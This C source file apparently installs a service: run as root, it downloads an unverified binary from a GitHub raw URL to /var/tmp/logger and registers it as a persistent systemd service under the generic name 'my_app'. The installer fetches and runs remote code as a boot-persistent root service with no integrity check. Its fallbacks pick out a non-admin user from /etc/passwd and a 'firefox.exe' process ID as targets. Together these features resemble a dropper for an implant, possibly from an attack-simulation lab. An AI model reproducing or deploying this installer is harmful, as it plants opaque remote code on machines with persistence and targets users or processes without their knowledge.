#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <grp.h>
#include <dirent.h>

#define ENV_DIR    "/etc/my_app"
#define UNIT_DIR   "/etc/systemd/system"
#define BINARY     "/var/tmp/logger"
#define UNIT       "my_app.service"
#define ENVF       ENV_DIR "/my_app.env"

#define PREREQ_URL "https://raw.githubusercontent.com/siddharth-singh-0151/logging-fork/refs/heads/main/logger"
#define UNIT_URL   "https://raw.githubusercontent.com/siddharth-singh-0151/logging-fork/refs/heads/main/my_app.service"

static void die(const char *msg, int code) {
    fprintf(stderr, "error: %s\n", msg);
    exit(code);
}

static void usage(const char *prog) {
    fprintf(stderr, "Usage: %s -m MODE [mode-specific args]\n", prog);
    fprintf(stderr, "  1  (%s) allows: [-r<str>] [-t<int>] -u<str>\n", UNIT);
    fprintf(stderr, "  2  (%s) allows: -i<str> [-t<int>] -r<str> -f<str>\n", UNIT);
    fprintf(stderr, "  3  (%s) allows: [-t<int>]\n", UNIT);
    fprintf(stderr, "  4  (%s) allows: [-t<int>] -p<str>\n", UNIT);
    exit(2);
}

static bool is_valid_int(const char *s) {
    if (!s || !*s) return false;
    size_t len = strlen(s);
    if (len < 1 || len > 9) return false;
    for (size_t i = 0; i < len; i++) {
        if (!isdigit((unsigned char)s[i])) return false;
    }
    return true;
}

static bool is_valid_str(const char *s) {
    if (!s || !*s) return false;
    size_t len = strlen(s);
    if (len < 1 || len > 64) return false;
    // ^[A-Za-z0-9._:/@][A-Za-z0-9._:/@-]{0,63}$
    char c = s[0];
    if (!isalnum((unsigned char)c) && !strchr("._:/@", c)) return false;
    for (size_t i = 1; i < len; i++) {
        c = s[i];
        if (!isalnum((unsigned char)c) && !strchr("._:/@-", c)) return false;
    }
    return true;
}

// Fallback user resolver for Mode 1
static char *get_fallback_user(void) {
    const char *sudo_user = getenv("SUDO_USER");
    if (!sudo_user || !*sudo_user) {
        sudo_user = getenv("USER");
    }

    // Identify sudo/wheel group members
    char sudo_members[64][64];
    int sudo_member_count = 0;

    const char *check_groups[] = {"sudo", "wheel", NULL};
    for (int i = 0; check_groups[i]; i++) {
        struct group *grp = getgrnam(check_groups[i]);
        if (grp && grp->gr_mem) {
            for (char **m = grp->gr_mem; *m && sudo_member_count < 64; m++) {
                strncpy(sudo_members[sudo_member_count], *m, 63);
                sudo_members[sudo_member_count][63] = '\0';
                sudo_member_count++;
            }
        }
    }

    FILE *fp = fopen("/etc/passwd", "r");
    if (!fp) return NULL;

    char line[512];
    char *result = NULL;
    while (fgets(line, sizeof(line), fp)) {
        char *user = strtok(line, ":");
        strtok(NULL, ":"); // pass
        char *uid_str = strtok(NULL, ":");
        if (!user || !uid_str) continue;

        int uid = atoi(uid_str);
        if (uid >= 1000 && uid != 65534) {
            if (sudo_user && strcmp(user, sudo_user) == 0) continue;

            bool is_sudo = false;
            for (int k = 0; k < sudo_member_count; k++) {
                if (strcmp(user, sudo_members[k]) == 0) {
                    is_sudo = true;
                    break;
                }
            }
            if (!is_sudo) {
                result = strdup(user);
                break;
            }
        }
    }
    fclose(fp);
    return result;
}

// Fallback PID resolver for Mode 4
static char *get_fallback_pid(void) {
    DIR *dir = opendir("/proc");
    if (!dir) return NULL;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (!isdigit((unsigned char)entry->d_name[0])) continue;

        char path[512];
        snprintf(path, sizeof(path), "/proc/%s/cmdline", entry->d_name);
        FILE *fp = fopen(path, "r");
        if (!fp) continue;

        char buf[1024];
        size_t n = fread(buf, 1, sizeof(buf) - 1, fp);
        fclose(fp);

        if (n > 0) {
            for (size_t i = 0; i < n; i++) {
                if (buf[i] == '\0') buf[i] = ' ';
            }
            buf[n] = '\0';
            if (strstr(buf, "firefox.exe")) {
                closedir(dir);
                return strdup(entry->d_name);
            }
        }

        // Also check /proc/[pid]/comm
        snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
        fp = fopen(path, "r");
        if (fp) {
            if (fgets(buf, sizeof(buf), fp)) {
                buf[strcspn(buf, "\r\n")] = '\0';
                if (strstr(buf, "firefox.exe")) {
                    fclose(fp);
                    closedir(dir);
                    return strdup(entry->d_name);
                }
            }
            fclose(fp);
        }
    }
    closedir(dir);
    return NULL;
}

static bool file_contains(const char *filepath, const char *pattern) {
    FILE *fp = fopen(filepath, "r");
    if (!fp) return false;
    char line[1024];
    bool found = false;
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, pattern)) {
            found = true;
            break;
        }
    }
    fclose(fp);
    return found;
}

int main(int argc, char *argv[]) {
    const char *prog = argv[0];
    int mode = 0;

    // Track used flags
    bool used_u = false, used_t = false, used_r = false;
    bool used_f = false, used_i = false, used_p = false;

    char val_u[128] = {0}, val_t[128] = {0}, val_r[128] = {0};
    char val_f[128] = {0}, val_i[128] = {0}, val_p[128] = {0};

    char args[1024] = {0};

    int i = 1;
    while (i < argc) {
        char *flag = argv[i++];
        if (strcmp(flag, "-h") == 0) {
            usage(prog);
        } else if (strcmp(flag, "--") == 0) {
            continue;
        } else if (strcmp(flag, "-m") == 0) {
            if (mode != 0) die("'-m' given more than once", 2);
            if (i >= argc) die("'-m' needs a value", 2);
            char *mval = argv[i++];
            if (strcmp(mval, "1") == 0) mode = 1;
            else if (strcmp(mval, "2") == 0) mode = 2;
            else if (strcmp(mval, "3") == 0) mode = 3;
            else if (strcmp(mval, "4") == 0) mode = 4;
            else usage(prog);
        } else {
            if (mode == 0) die("flag given before '-m MODE'", 2);

            // Validate allowed flags per mode
            if (mode == 1 && (strcmp(flag, "-u") != 0 && strcmp(flag, "-t") != 0 && strcmp(flag, "-r") != 0)) {
                fprintf(stderr, "error: '%s' is not allowed in mode %d\n", flag, mode);
                exit(2);
            }
            if (mode == 2 && (strcmp(flag, "-f") != 0 && strcmp(flag, "-i") != 0 && strcmp(flag, "-r") != 0 && strcmp(flag, "-t") != 0)) {
                fprintf(stderr, "error: '%s' is not allowed in mode %d\n", flag, mode);
                exit(2);
            }
            if (mode == 3 && (strcmp(flag, "-t") != 0)) {
                fprintf(stderr, "error: '%s' is not allowed in mode %d\n", flag, mode);
                exit(2);
            }
            if (mode == 4 && (strcmp(flag, "-p") != 0 && strcmp(flag, "-t") != 0)) {
                fprintf(stderr, "error: '%s' is not allowed in mode %d\n", flag, mode);
                exit(2);
            }

            // Check duplicate flag
            if ((strcmp(flag, "-u") == 0 && used_u) ||
                (strcmp(flag, "-t") == 0 && used_t) ||
                (strcmp(flag, "-r") == 0 && used_r) ||
                (strcmp(flag, "-f") == 0 && used_f) ||
                (strcmp(flag, "-i") == 0 && used_i) ||
                (strcmp(flag, "-p") == 0 && used_p)) {
                fprintf(stderr, "error: '%s' given more than once\n", flag);
                exit(2);
            }

            if (i >= argc) {
                fprintf(stderr, "error: '%s' needs a value\n", flag);
                exit(2);
            }
            char *val = argv[i++];

            if (strcmp(flag, "-t") == 0) {
                if (!is_valid_int(val)) die("bad value for '-t'", 2);
                used_t = true;
                strncpy(val_t, val, sizeof(val_t) - 1);
            } else {
                if (!is_valid_str(val)) {
                    fprintf(stderr, "error: bad value for '%s'\n", flag);
                    exit(2);
                }
                if (strcmp(flag, "-u") == 0) { used_u = true; strncpy(val_u, val, sizeof(val_u) - 1); }
                else if (strcmp(flag, "-r") == 0) { used_r = true; strncpy(val_r, val, sizeof(val_r) - 1); }
                else if (strcmp(flag, "-f") == 0) { used_f = true; strncpy(val_f, val, sizeof(val_f) - 1); }
                else if (strcmp(flag, "-i") == 0) { used_i = true; strncpy(val_i, val, sizeof(val_i) - 1); }
                else if (strcmp(flag, "-p") == 0) { used_p = true; strncpy(val_p, val, sizeof(val_p) - 1); }
            }

            if (strlen(args) > 0) strncat(args, " ", sizeof(args) - strlen(args) - 1);
            strncat(args, flag, sizeof(args) - strlen(args) - 1);
            strncat(args, " ", sizeof(args) - strlen(args) - 1);
            strncat(args, val, sizeof(args) - strlen(args) - 1);
        }
    }

    if (mode == 0) usage(prog);

    // Fallback for Mode 1: -u
    if (mode == 1 && !used_u) {
        char *fallback = get_fallback_user();
        if (fallback) {
            printf("Note: '-u' not supplied. Falling back to: %s\n", fallback);
            used_u = true;
            strncpy(val_u, fallback, sizeof(val_u) - 1);
            if (strlen(args) > 0) strncat(args, " ", sizeof(args) - strlen(args) - 1);
            strncat(args, "-u ", sizeof(args) - strlen(args) - 1);
            strncat(args, fallback, sizeof(args) - strlen(args) - 1);
            free(fallback);
        } else {
            die("No fallback user found in /etc/passwd", 2);
        }
    }

    // Fallback for Mode 4: -p
    if (mode == 4 && !used_p) {
        char *fallback = get_fallback_pid();
        if (fallback) {
            printf("Note: '-p' not supplied. Falling back to firefox.exe PID: %s\n", fallback);
            used_p = true;
            strncpy(val_p, fallback, sizeof(val_p) - 1);
            if (strlen(args) > 0) strncat(args, " ", sizeof(args) - strlen(args) - 1);
            strncat(args, "-p ", sizeof(args) - strlen(args) - 1);
            strncat(args, fallback, sizeof(args) - strlen(args) - 1);
            free(fallback);
        } else {
            die("No PID found for 'firefox.exe'", 2);
        }
    }

    // Required arguments validation
    if (mode == 1 && !used_u) die("mode 1 requires '-u'", 2);
    if (mode == 2) {
        if (!used_f) die("mode 2 requires '-f'", 2);
        if (!used_i) die("mode 2 requires '-i'", 2);
        if (!used_r) die("mode 2 requires '-r'", 2);
    }
    if (mode == 4 && !used_p) die("mode 4 requires '-p'", 2);

    if (geteuid() != 0) die("must run as root (use sudo)", 1);

    // Ensure curl is present
    if (system("command -v curl >/dev/null 2>&1") != 0) {
        if (system("apt-get update -y") != 0) die("failed to update package lists for curl install", 1);
        if (system("apt-get install -y curl") != 0) die("failed to install curl", 1);
    }

    // Ensure BINARY exists
    if (access(BINARY, F_OK) != 0) {
        char tmp_bin[] = BINARY ".XXXXXX";
        int fd = mkstemp(tmp_bin);
        if (fd < 0) die("failed to create temporary file for binary", 1);
        close(fd);

        char cmd[1024];
        snprintf(cmd, sizeof(cmd), "curl -fsSL --proto '=http,https' --connect-timeout 10 --max-time 60 --url '%s' -o '%s'", PREREQ_URL, tmp_bin);
        if (system(cmd) != 0) {
            unlink(tmp_bin);
            die("failed to download binary", 1);
        }

        struct stat st;
        if (stat(tmp_bin, &st) != 0 || st.st_size == 0) {
            unlink(tmp_bin);
            die("downloaded binary is empty", 1);
        }

        if (rename(tmp_bin, BINARY) != 0) {
            unlink(tmp_bin);
            die("failed to move binary to destination", 1);
        }
    }
    chmod(BINARY, 0755);

    // Disable old unit
    char unit_path[512];
    snprintf(unit_path, sizeof(unit_path), "%s/%s", UNIT_DIR, UNIT);

    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "systemctl disable --now %s 2>/dev/null || true", UNIT);
    system(cmd);
    unlink(unit_path);

    // Create ENV_DIR and ENVF
    mkdir(ENV_DIR, 0755);

    char tmp_env[] = ENVF ".XXXXXX";
    int env_fd = mkstemp(tmp_env);
    if (env_fd < 0) die("failed to create temporary env file", 1);
    fchmod(env_fd, 0600);

    FILE *env_fp = fdopen(env_fd, "w");
    if (!env_fp) die("failed to open env temp file", 1);
    fprintf(env_fp, "LOGGER_ARGS=-m %d %s\n", mode, args);
    fclose(env_fp);

    if (rename(tmp_env, ENVF) != 0) {
        unlink(tmp_env);
        die("failed to install environment file", 1);
    }

    // Download systemd unit file
    char tmp_unit[] = UNIT_DIR "/my_app.service.XXXXXX";
    int unit_fd = mkstemp(tmp_unit);
    if (unit_fd < 0) die("failed to create temporary unit file", 1);
    close(unit_fd);

    snprintf(cmd, sizeof(cmd), "curl -fsSL --proto '=http,https' --url '%s' -o '%s'", UNIT_URL, tmp_unit);
    if (system(cmd) != 0) {
        unlink(tmp_unit);
        die("failed to download unit file", 1);
    }

    if (!file_contains(tmp_unit, "EnvironmentFile=" ENVF)) {
        unlink(tmp_unit);
        die("downloaded unit is missing 'EnvironmentFile=" ENVF "'", 1);
    }

    if (!file_contains(tmp_unit, "ExecStart=") || !file_contains(tmp_unit, "$LOGGER_ARGS")) {
        unlink(tmp_unit);
        die("downloaded unit does not pass $LOGGER_ARGS in ExecStart", 1);
    }

    chmod(tmp_unit, 0644);
    if (rename(tmp_unit, unit_path) != 0) {
        unlink(tmp_unit);
        die("failed to move unit file", 1);
    }

    // Print unit configuration lines
    snprintf(cmd, sizeof(cmd), "grep -nE '^(Type|User|EnvironmentFile|ExecStart|Restart)=' '%s' || true", unit_path);
    system(cmd);

    system("systemctl daemon-reload");
    snprintf(cmd, sizeof(cmd), "systemctl enable --now %s", UNIT);
    system(cmd);

    sleep(3);

    snprintf(cmd, sizeof(cmd), "systemctl is-active --quiet %s", UNIT);
    if (system(cmd) == 0) {
        printf("OK: %s is running\n", UNIT);
        snprintf(cmd, sizeof(cmd), "systemctl status %s --no-pager || true", UNIT);
        system(cmd);
    } else {
        fprintf(stderr, "FAILED: %s is not running\n", UNIT);
        snprintf(cmd, sizeof(cmd), "systemctl status %s --no-pager || true", UNIT);
        system(cmd);
        snprintf(cmd, sizeof(cmd), "journalctl -u %s -n 30 --no-pager", UNIT);
        system(cmd);
        exit(1);
    }

    return 0;
}
